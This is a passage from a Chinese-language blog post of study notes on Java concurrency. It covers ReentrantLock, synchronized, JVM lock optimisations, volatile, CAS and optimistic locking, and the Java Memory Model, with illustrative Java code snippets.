<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">(<span class="keyword">long</span> timeout, TimeUnit unit)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sync.tryAcquireNanos(<span class="number">1</span>, unit.toNanos(timeout));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread thread=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;尝试获得锁&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!lock.tryLock(<span class="number">1</span>, TimeUnit.SECONDS))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;获取不到锁&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;获得到锁&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;主线程&quot;</span>);</span><br><span class="line">    thread.start();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">    lock.unlock();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Synchronized和ReentrantLock的区别"><a href="#Synchronized和ReentrantLock的区别" class="headerlink" title="Synchronized和ReentrantLock的区别"></a>Synchronized和ReentrantLock的区别</h2><ul>
<li><code>synchronized</code>是JVM层面实现，通过调用对象的<code>monitor</code>锁来实现。<code>ReentrantLock</code>是JDK层面实现的锁，继承了AQS。 尽管<code>Synchronized</code>属于重量级锁，但JDK1.6之后加入了锁优化，如轻量级锁、偏向锁、自旋锁、自适应自旋锁、锁粗化等技术，使得俩者间大致相同。</li>
<li>俩者都是可重入锁，可重入锁”概念是：自己可以再次获取自己的内部锁。比如一个线程获得了某个对象的锁，此时这个对象锁还没有释放，当其再次想要获取这个对象的锁时还可以获取，如果是不可重入锁的话，会造成死锁。同一个线程每次获取锁，锁的计数器都自增1，所以要等到锁的计数器下降为0才能释放锁。</li>
<li>当持有锁的线程长期不释放锁时，正在等待的线程可以选择放弃等待，改为处理其他事情，<code>ReentrantLock</code>可中断(通过<code>lock.lockInterruptibly()</code>来实现），而<code>Synchronized</code>不行</li>
<li>一个<code>ReentrantLock</code>可以同时绑定多个等待队列<code>Condition</code>对象，从而可以有选择性进行线程通知，在调度线程上更加灵活。而<code>Synchronized</code>只能绑定一个等待队列<code>waitSet</code>，在使用<code>notify()</code>进行通知时，是由JVM进行选择被通知的线程的。</li>
<li>公平锁是指多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁。<code>synchronized</code>中的锁是非公平的，<code>ReentrantLock</code>默认情况下也是非公平的，但是也可以是公平的（通过<code>ReentrantLock</code>类的<code>ReentrantLock(boolean fair)</code>。</li>
</ul>
<p><strong>使用选择</strong>：除非需要使用<code>ReentrantLock</code>的高级功能，否则优先使用<code>synchronized</code>。这是因为<code>synchronized</code>是 JVM 实现的一种锁机制，JVM 原生地支持它，而<code>ReentrantLock</code>不是所有的 JDK 版本都支持。并且使用<code>synchronized</code>不用担心没有释放锁而导致死锁问题，因为 JVM 会确保锁的释放。</p>
<h2 id="锁优化"><a href="#锁优化" class="headerlink" title="锁优化"></a>锁优化</h2><blockquote>
<p>锁优化主要指JVM对<code>synchronized</code>的优化</p>
</blockquote>
<h3 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h3><p>互斥同步进入阻塞状态的开销都很大，应该尽量避免。在许多应用中，共享数据的锁定状态只会持续很短的一段时间。自旋锁的思想是让一个线程在请求一个共享数据的锁时自旋一段时间，如果在这段时间内能获得锁，就可以避免进入阻塞状态。</p>
<p>自旋锁虽然能避免进入阻塞状态从而减少开销，但是它需要进行自旋操作占用cpu时间，它只适用于共享数据的锁定状态时间很短的场景。</p>
<p>在jdk1.6中引入了自适应自旋锁，自适应意味着自旋次数不再固定，而是由前一次在同一个锁上的自旋次数及锁的拥有者的状态来决定。</p>
<h3 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a>轻量级锁</h3><p>jdk1.6 引入了偏向锁和轻量级锁，从而让锁拥有了四个状态: 无锁状态(unlocked)、偏向锁状态(biased)、轻量级锁(lightweight locked)和重量级锁状态(inflated)</p>
<p>java对象头内存布局，这些数据被称为<code>Mark Word</code></p>
<img src="https://csn.damyoung.cn/image-20201002234814861.png" alt="image-20201002234814861" style="zoom:80%;" />

<p>下图左侧是一个线程的虚拟机栈，其中有一部分称为<code>Lock Record</code>的区域，这是在轻量级锁运行过程创建的，用于存放锁对象的<code>Mark Word</code>。而右侧就是一个锁对象，包含了<code>Mark Word</code>和其它信息。</p>
<p><img src="https://csn.damyoung.cn/051e436c-0e46-4c59-8f67-52d89d656182.png"></p>
<p>轻量级锁是相对于传统的重量级锁而言，它使用CAS 操作来避免重量级锁使用互斥量的开销，对于大部分锁，在整个同步周期内都是不存在竞争的，因此也就不需要都使用互斥量进行同步，可以先采用CAS操作进行同步，如果CAS失败了再改用互斥量进行同步</p>
<p>当尝试获取一个锁对象时，如果锁对象标记为<code>0 01</code>，说明锁对象的锁未锁定（<code>unlocked</code>）状态。此时虚拟机在当前线程的虚拟机栈中创建<code>Lock Record</code>，然后使用<code>CAS</code>操作将对象的<code>Mark Word</code>更新为<code>Lock Record</code>指针。</p>
<p>如果<code>CAS</code>操作成功了，那么线程就获取了该对象上的锁，并且对象的<code>Mark Word</code>的锁标记变为 <code>00</code>，表示该对象处于轻量级锁状态。</p>
<p>如果<code>CAS</code>操作失败了，虚拟机首先会检查对象的<code>Mark Word</code>是否指向当前线程的虚拟机栈，如果是的话说明当前线程已经拥有了这个锁对象，那就可以直接进入同步块继续执行，否则说明这个锁对象已经被其他线程线程抢占了。如果有两条以上的线程争用同一个锁，那轻量级锁就不再有效，要膨胀为重量级锁。</p>
<h3 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h3><p>偏向锁的思想是偏向于让第一个获取锁对象的线程，这个线程之后获取该锁不再需要进行同步操作，甚至连CAS操作也不再需要；也就是说，偏向锁会偏向于第一个获得它的线程，如果在接下来的执行中，该锁没有被其他线程获取，那么持有偏向锁的线程就不需要进行同步。</p>
<p>当锁对象第一次被线程获得的时候，进入偏向状态，标记为 1 01。同时使用 CAS 操作将线程 ID 记录到 Mark Word 中，如果 CAS 操作成功，这个线程以后每次进入这个锁相关的同步块就不需要再进行任何同步操作。</p>
<p>当有另外一个线程去尝试获取这个锁对象时，偏向状态就宣告结束，此时撤销偏向（Revoke Bias）后恢复到未锁定状态或者轻量级锁状态（不会立即膨胀为重量级锁）。</p>
<p><strong>锁膨胀顺序：偏向锁-&gt;轻量级锁-&gt;自旋锁-&gt;重量级锁</strong></p>
<h3 id="锁消除"><a href="#锁消除" class="headerlink" title="锁消除"></a>锁消除</h3><p>锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除</p>
<p>锁消除主要通过逃逸分析来支持，如果堆上共享数据不可能逃逸出去被其他线程访问到，那么就可以把它们当成私有数据对待，也就可以将它们的锁进行消除。</p>
<p>对于一些看起来没有加锁的代码，其实隐式的加了很多锁。例如下面的字符串拼接代码就隐式加了锁：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">concatString</span><span class="params">(String s1, String s2, String s3)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//sb=new StringBuffer();</span></span><br><span class="line">    <span class="comment">//sb.append(s1).append(s2).append(s3).toString();</span></span><br><span class="line">    <span class="keyword">return</span> s1 + s2 + s3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>String</code>是一个不可变的类，编译器会对<code>String</code>的拼接自动优化。在JDK1.5之前，会转化为<code>StringBuffer</code>对象的连续<code>append()</code>操作。</p>
<blockquote>
<p>现在使用<code>StringBuilder</code>,线程不安全，效率高</p>
</blockquote>
<p>每个<code>append()</code>方法中都有一个同步块。虚拟机观察变量<code>sb</code>，很快就会发现它的动态作用域被限制在<code>concatString()</code>方法内部。也就是说，<code>sb</code>的所有引用永远不会逃逸到<code>concatString()</code>方法之外，其他线程无法访问到它，因此可以进行消除。</p>
<h3 id="锁粗化"><a href="#锁粗化" class="headerlink" title="锁粗化"></a>锁粗化</h3><p>如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。</p>
<p>上一节的示例代码中连续的<code>append()</code>方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。对于上一节的示例代码就是扩展到第一个<code>append()</code>操作之前直至最后一个<code>append()</code>操作之后，这样只需要加锁一次就可以了</p>
<h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><h3 id="底层实现"><a href="#底层实现" class="headerlink" title="底层实现"></a>底层实现</h3><p><strong>两个作用</strong></p>
<ol>
<li><strong>内存可见性</strong>：当变量被volatile修饰后，表示着线程本地内存无效，当一个线程修改共享变量后它会立即被更新到主存中，其他线程读取共享变量时，会直接从主存中读取</li>
<li><strong>禁止指令重排序</strong>：通过添加内存屏障的方式来禁止指令重排，即重排序时不能把后面的指令放到内存屏障之前。</li>
</ol>
<p>volatile能够保证有序性，禁止指令重排序；但不能保证原子性，仅仅用于仅有一个写操作场景下或运算结果并不依赖于变量的当前值。</p>
<p>其实现主要涉及到两个 CPU 术语：</p>
<ul>
<li><strong>内存屏障</strong>（memory barriers）：一组处理器指令，用于实现对内存操作的顺序限制。</li>
<li><strong>缓存行</strong>（cache line）：CPU高速缓存中可以分配的最小存储单位。处理器填写缓存行时会加载整个缓存行。</li>
</ul>
<h3 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a>可见性</h3><ul>
<li>写屏障sfence,写屏障之前的所有修改都会同步到主存中</li>
<li>读屏障lfence,读屏障之后读取的都是主存中最新的数据</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> isover=<span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">//读屏障</span></span><br><span class="line">                <span class="keyword">while</span> (!isOver) &#123;</span><br><span class="line">                    a++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">500</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        isOver = <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment">//写屏障</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="有序性"><a href="#有序性" class="headerlink" title="有序性"></a>有序性</h3><ul>
<li>写屏障，不会将写屏障之前的代码排在写屏障之后</li>
<li>读屏障，不会将读屏障之后的代码排在读屏障之前</li>
</ul>
<p><strong>注意</strong></p>
<ol>
<li>读屏障仅仅保证之后的读能够读取到最新的结果，但不能保证之前的读操作是最新结果</li>
<li>有序性的保证只是保证本线程的相关代码不被重排序</li>
</ol>
<p>双检锁单例模式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;<span class="comment">//步骤1</span></span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;<span class="comment">//步骤2</span></span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;<span class="comment">//步骤3</span></span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();<span class="comment">//步骤4</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line">                    counter++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(counter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动10个线程，每个线程都自加10000次，如果不出现线程安全的问题最终的结果应该就是：10*10000 = 100000;可是运行多次都是小于100000的结果，问题在于 <strong>volatile并不能保证原子性</strong></p>
<p>counter++这并不是一个原子操作，包含了三个步骤：1.读取变量counter的值；2.对counter加一；3.将新值赋值给变量counter。</p>
<p>如果线程A读取counter到工作内存后，其他线程对这个值已经做了自增操作后，那么线程A的这个值自然而然就是一个过期的值，因此，总结果必然会是小于100000的。</p>
<p>让volatile保证原子性，必须符合以下两条规则：</p>
<ol>
<li><strong>运算结果并不依赖于变量的当前值，或者能够确保只有一个线程修改变量的值；</strong></li>
<li><strong>变量不需要与其他的状态变量共同参与不变约束</strong></li>
</ol>
<h3 id="volatile修饰数组和对象"><a href="#volatile修饰数组和对象" class="headerlink" title="volatile修饰数组和对象"></a>volatile修饰数组和对象</h3><p>volatile 修饰对象或数组时，只能保证他们的<strong>引用地址的可见性</strong>，而不能保证其内部元素具有可见性。</p>
<p>但是如果对于同一个数组，用 volatile 修饰后，在一个线程改编数组中的值，在另一个线程中还是可以马上读取到更新的新值，原因是：</p>
<blockquote>
<p>当另一个线程读取 array 时，因为 array 的引用被 volatile 修饰，所以线程对所有变量都会从主内存去获取，当然也就包括数组的内部值（例如 array[0]）。 所以会让人产生误解，以为是volatile修饰的数组保证了其数组的可见性，其实不然。</p>
</blockquote>
<h2 id="Synchronized和Volatile的区别"><a href="#Synchronized和Volatile的区别" class="headerlink" title="Synchronized和Volatile的区别"></a>Synchronized和Volatile的区别</h2><ul>
<li><code>volatile</code>关键字是线程同步的轻量级实现，故<code>volatile</code>比<code>synchronized</code>性能要好；<code>volatile</code>关键字只能用于变量而<code>synchronized</code>可以修饰方法和代码块</li>
<li><code>volatile</code>保证数据的可见性，但是不能保证数据的原子性；<code>synchronized</code>俩者都能保证</li>
<li>多线程使用<code>volatile</code>不会发生阻塞，<code>synchronized</code>可能会发生阻塞</li>
<li><code>volatile</code>主要用于解决变量在多个线程之间的可见性，而<code>synchronized</code>解决多线程访问资源的同步性</li>
</ul>
<h1 id="无锁操作"><a href="#无锁操作" class="headerlink" title="无锁操作"></a>无锁操作</h1><h2 id="乐观锁和悲观锁"><a href="#乐观锁和悲观锁" class="headerlink" title="乐观锁和悲观锁"></a>乐观锁和悲观锁</h2><h3 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h3><p>总是设想最好的情况，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但在每次更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号机制和CAS算法实现</p>
<p>乐观锁适用于读多写少的场景，这样可以提高吞吐量，像数据库提供的类似于write_condition机制，其实都是提供的乐观锁。在Java中<code>Java.util.concurrent.atomic</code>包下面的原子变量类就是使用乐观锁的一种实现方式CAS实现的</p>
<h3 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h3><p>总是设想最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到拿到锁(共享资源每次只给一个线程，其他线程想获得共享资源会进入阻塞状态，用完后再把资源转让给其他线程)。</p>
<p>传统的关系型数据库中就用到很多这种锁机制，如行锁、表锁等，读锁、写锁等都是在操作之前先上锁。Java中<code>ReentrantLock</code>和<code>Synchronized</code>等独占锁都是悲观锁思想的实现</p>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>通过对两种锁的介绍，各有优缺点；乐观锁用于读多写少的场景，即冲突很少发生，使用乐观锁可以减少锁的开销，加大整个系统的吞吐量。但如果是多写的情况，一般会经常发生冲突，这样会导致上层应用会不断的重试，这样反倒是降低了性能，这样多写的场景下用悲观锁就比较合适。</p>
<h2 id="乐观锁两种实现方式"><a href="#乐观锁两种实现方式" class="headerlink" title="乐观锁两种实现方式"></a>乐观锁两种实现方式</h2><p>乐观锁常见的两种实现方式是<strong>版本号机制</strong>和<strong>CAS算法</strong></p>
<h3 id="版本号机制"><a href="#版本号机制" class="headerlink" title="版本号机制"></a>版本号机制</h3><p>一般在数据表加上一个数据版本号<code>version</code>字段，表示数据被修改次数，当数据被修改时会将<code>version</code>值加一。但线程A要更新数据值时，在读取数据时同时也会读取<code>version</code>值，在提交更新时，若开始读取的<code>version</code>值与当前数据表中的<code>version</code>值相等时才会更新，否则重试更新操作，直到更新成功为止。</p>
<h3 id="CAS算法"><a href="#CAS算法" class="headerlink" title="CAS算法"></a>CAS算法</h3><p>即<code>compare and swap</code>(比较与交换)，用来鉴别线程是否出现冲突，出现冲突就不断重试当前操作直到没有冲突为止，一种有名的无锁算法。</p>
<p>无锁编程，即不使用锁的情况下实现多线程之间的变量同步，也就是在没有线程被阻塞的情况下实现变量的同步，所以也叫<strong>非阻塞同步</strong>（<code>Non-blocking Synchronization</code>）。</p>
<p>3个基本操作数：内存地址V(可能被其他线程修改的值)，旧的期望值O(先前获取的值)，要修改的新值N</p>
<p>更新变量时，当变量的期望值与内存地址V当中的实际值相同时，才会将内存地址V对应的值修改为N</p>
<h2 id="乐观锁特点和缺点"><a href="#乐观锁特点和缺点" class="headerlink" title="乐观锁特点和缺点"></a>乐观锁特点和缺点</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>无锁操作效率高，是非阻塞锁故不会进入阻塞状态，减少线程间上下文切换，提高系统吞吐量，但会自旋cas消耗系统资源，体现了<strong>无锁并发，无阻塞并发</strong>，但在竞争激烈时反而会影响效率，适合读多写少的场景。</p>
<p>它认为线程在读写共享资源时不会发生冲突，不会冲突自然就不会阻塞其他线程的操作，故就不会出现阻塞。为了获取变量最新值(内存地址V)，为了保证该变量的可见性需要使用<strong>volatile</strong>修饰。</p>
<h3 id="ABA问题"><a href="#ABA问题" class="headerlink" title="ABA问题"></a>ABA问题</h3><p>CAS会检查旧值有无变化，比如一个旧值A变为了成B，然后再变成A，刚好在做CAS时检查发现旧值并没有变化依然为A，但是实际上的确发生了变化</p>
<p><strong>解决</strong>：添加一个版本号<code>AtomicStampedReference()</code>，原来的变化路径A-&gt;B-&gt;A就变成了1A-&gt;2B-&gt;3C。</p>
<h3 id="自旋时间过长"><a href="#自旋时间过长" class="headerlink" title="自旋时间过长"></a>自旋时间过长</h3><p>CAS是<strong>非阻塞</strong>同步，不会把线程挂起，会自旋进行下一次尝试，自旋时间过长会对性能消耗</p>
<h3 id="只能保证一个共享变量的原子操作"><a href="#只能保证一个共享变量的原子操作" class="headerlink" title="只能保证一个共享变量的原子操作"></a>只能保证一个共享变量的原子操作</h3><p>当对一个共享变量执行操作时CAS能保证其原子性，如果对多个共享变量进行操作,CAS就不能保证其原子性</p>
<p><strong>解决：</strong>用一个对象整合多个共享变量，atomic中提供<code>AtomicReference</code>来保证引用对象之间的原子性</p>
<h2 id="CAS和Synchronized使用场景"><a href="#CAS和Synchronized使用场景" class="headerlink" title="CAS和Synchronized使用场景"></a>CAS和Synchronized使用场景</h2><blockquote>
<p>简单的来说CAS适用于写比较少的情况下（多读场景，冲突一般较少），synchronized适用于写比较多的情况下（多写场景，冲突一般较多）</p>
</blockquote>
<p>对于资源竞争较少（线程冲突较轻）的情况，使用<code>synchronized</code>同步锁进行线程阻塞和唤醒切换以及用户态内核态间的切换操作额外浪费消耗cpu资源；而<code>CAS</code>基于硬件实现，不需要进入内核，不需要切换线程，操作自旋几率较少，因此可以获得更高的性能。</p>
<p>对于资源竞争严重（线程冲突严重）的情况，<code>CAS</code>自旋的概率会比较大，从而浪费更多的CPU资源，效率低于<code>synchronized</code>。</p>
<h1 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h1><h2 id="JMM概念"><a href="#JMM概念" class="headerlink" title="JMM概念"></a>JMM概念</h2><blockquote>
<p>JMM即<code>Java Memory Model</code>从属于JVM，定义主存、工作内存等抽象概念，底层对应CPU寄存器、缓存、硬件内存、CPU指令优化等，JMM试图屏蔽各种硬件和操作系统的内存差异，使得Java代码在各种平台都达到一致的内存效果。</p>
<p>多线程下Java代码的执行顺序，共享变量的读写</p>
</blockquote>
<p>共享变量会先放在主存中，每个线程都有属于自己的工作内存，工作内存存储在高速缓存或者寄存器中，保存了该线程使用的变量的主存副本拷贝，之后的读写操作均使用位于工作内存中的变量副本，并在某个时刻将工作内存的变量副本写回主存中去。</p>
<p>线程只能操作自己工作内存中的变量副本，不同线程之间的变量值需要通过主存来完成。</p>
<p><img src="https://csn.damyoung.cn/15851555-5abc-497d-ad34-efed10f43a6b.png"></p>
<h2 id="内存间交互操作"><a href="#内存间交互操作" class="headerlink" title="内存间交互操作"></a>内存间交互操作</h2><p>Java内存模型定义了8个操作来完成主内存和工作内存的交互操作</p>
<p><img src="https://github.com/CyC2018/CS-Notes/raw/master/notes/pics/8b7ebbad-9604-4375-84e3-f412099d170c.png" alt="内存交互操作"></p>
<ul>
<li>read：把一个变量的值从主存传输到工作内存中</li>
<li>load：在<code>read</code>之后执行，把<code>read</code>得到的值放入工作内存的变量副本中</li>
<li>use：把工作内存的一个变量的值传递给执行引擎</li>
<li>assign：把一个从执行引擎接收到的值赋给工作内存的变量</li>
<li>store：把工作内存的一个变量的值传送到主存中</li>
<li>write：在<code>store</code>之后执行，把<code>store</code>得到的值放入主存变量中</li>
<li>lock：作用于主内存的变量</li>
<li>unlock</li>
</ul>
<h2 id="内存模型三大特性"><a href="#内存模型三大特性" class="headerlink" title="内存模型三大特性"></a>内存模型三大特性</h2><ul>
<li>原子性：保证指令不会受到线程上下文切换的影响</li>
<li>可见性：保证指令不会受到cpu缓存的影响</li>
<li>有序性：保证指令不会受到cpu指令并行优化的影响</li>
</ul>
<h3 id="原子性-1"><a href="#原子性-1" class="headerlink" title="原子性"></a>原子性</h3><blockquote>
<p>原子性：一个操作是不可中断，要么全部执行成功，要么全部执行失败</p>
</blockquote>
<h4 id="int的原子性"><a href="#int的原子性" class="headerlink" title="int的原子性"></a>int的原子性</h4><blockquote>
<p>注意，<code>int</code>等原子性的类型在多线程环境中虽然具有原子性，但是还是会出现线程安全问题。如下代码：最后输出结果有可能小于1000.</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCnt</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="comment">//线程数</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> threadSize=<span class="number">1000</span>;</span><br><span class="line">    Singleton singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建线程池</span></span><br><span class="line">    ExecutorService pool = Executors.newCachedThreadPool();</span><br><span class="line">    CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; threadSize; i++) &#123;</span><br><span class="line">        pool.execute(()-&gt;&#123;</span><br><span class="line">            singleton.add();</span><br><span class="line">            latch.countDown();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//main等待countDown子线程执行结束</span></span><br><span class="line">    latch.await();</span><br><span class="line">    pool.shutdown();</span><br><span class="line">    System.out.println(singleton.getCnt());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个线程同时对<code>cnt</code>进行操作，<code>load</code>,<code>assign</code>和<code>store</code>等一系列操作整体上看<strong>不具有原子性</strong>，如下图所示，在T1线程修改<code>cnt</code>并且还没有将修改后的值写入主内存，T2依然可以读入旧值。可以看出，这两个线程虽然执行了两次自增操作，但是主内存中<code>cnt</code>的值最后为1而不是2。因此对<code>int</code>类型读写操作满足原子性只是说明<code>load</code>,<code>assign</code>,<code>store</code>这些<strong>单个操作具备原子性</strong>。</p>
<p><img src="https://github.com/CyC2018/CS-Notes/raw/master/notes/pics/2797a609-68db-4d7b-8701-41ac9a34b14f.jpg" alt="多线程下单个操作原子性"></p>
<h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><ol>
<li>使用<code>AtomicInteger</code>重写之前线程不安全的代码之后得到线程安全的实现</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> AtomicInteger cnt=<span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cnt.incrementAndGet();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> AtomicInteger <span class="title">getCnt</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用<code>Synchronized</code>互斥锁来保证临界区代码的原子性，对应内存间操作的<code>lock</code>、<code>unlock</code>，在虚拟机上实现上对应字节码指令的<code>monitorenter</code>、<code>monitorexit</code></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">getCnt</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

